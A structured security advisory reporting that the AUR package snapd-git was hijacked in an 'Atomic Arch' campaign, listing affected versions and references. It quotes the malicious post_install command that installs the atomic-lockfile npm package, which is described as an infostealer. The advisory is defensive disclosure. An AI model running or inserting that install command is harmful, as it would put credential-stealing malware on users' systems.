[advisory]
package = "snapd-git"
severity = "critical"
status = "confirmed"
reported = "2026-06-11"
updated = "2026-06-11"
reported_by = "The Cinder Project"
cve = ""

[details]
summary = "Hijacked AUR package — Atomic Arch campaign delivered infostealer via post_install hook"
description = """
The snapd-git package was taken over by a newly created AUR account and modified to
install the malicious atomic-lockfile npm package via a post_install hook.

Attack vector: orphaned package adopted by attacker account tobiaswesterburg.
The modified PKGBUILD added a post_install() function that ran:
  cd /tmp && npm install atomic-lockfile axios cosmiconfig uuid

All versions published after June 11, 2026 by the new maintainer are compromised.
"""
affected_versions = ["*"]
safe_versions = []

[references]
urls = [
  "https://bbs.archlinux.org/viewtopic.php?id=313892",
  "https://github.com/lenucksi/aur-malware-check",
]
